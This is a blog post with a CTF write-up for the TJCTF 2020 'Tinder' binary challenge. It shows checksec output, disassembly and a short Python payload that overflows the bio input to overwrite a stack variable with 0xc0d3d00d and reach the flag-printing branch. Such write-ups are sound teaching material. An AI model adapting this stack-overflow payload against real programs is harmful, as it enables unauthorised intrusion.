---
layout: post
title:  "Tinder"
date:   2020-05-29 20:20:01 -0300
categories: [CTF,PWN,TJCTF 2020]
author: rogeriobastos
event: "TJCTF 2020"
tags: [CTF,PWN,TJCTF 2020]
description: "Writeup Gamer R Challenge"
image: ""
---

# TJCTF 2020

## Tinder (binary)

### Description

> [Start swiping](match)!
> 
> `nc p1.tjctf.org 8002`
>
> Written by agcdragon

25 points

### Solution Summary

Overwrite variable with expected value to get into conditional statement that print the flag.

### Walkthrough

The binary is a 32bits file with NX enabled.

```
$ pwn checksec match
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

The program read some user data and the buffer overflow happens at fourth input.

```
$ ./match 
Welcome to TJTinder, please register to start matching!
Name: bla
Username: bli
Password: blu 
Tinder Bio: lolo       <= OVERFLOW HAPPENS HERE

Registered 'bli' to TJTinder successfully!
Searching for matches...
Sorry, no matches found. Try Again!
```

After that, compare a local variable with `0xc0d3d00d`.

```
   0x080488e4 <+247>:	cmp    DWORD PTR [ebp-0xc],0xc0d3d00d
   0x080488eb <+254>:	jne    0x80489a8 <main+443>
```

If the variable has the expected value, so jump does not happen, the program opens a file and prints the flag.

```
   0x08048949 <+348>:	call   0x8048570 <fopen@plt>
   0x0804894e <+353>:	add    esp,0x10
   0x08048951 <+356>:	mov    DWORD PTR [ebp-0x10],eax
   0x08048954 <+359>:	cmp    DWORD PTR [ebp-0x10],0x0
   0x08048958 <+363>:	jne    0x8048976 <main+393>
   0x0804895a <+365>:	sub    esp,0xc
   0x0804895d <+368>:	lea    eax,[ebx-0x1494]
   0x08048963 <+374>:	push   eax
   0x08048964 <+375>:	call   0x8048520 <puts@plt>
   0x08048969 <+380>:	add    esp,0x10
   0x0804896c <+383>:	sub    esp,0xc
   0x0804896f <+386>:	push   0x0
   0x08048971 <+388>:	call   0x8048530 <exit@plt>
```

The offset can be find using a pattern generator and inspecting `ebp-0xc` in a debugger.

### Exploit

```python
import struct

print 'A'*15
print 'A'*15
print 'A'*15
print 'A'*116 + struct.pack('<I', 0xc0d3d00d)
```
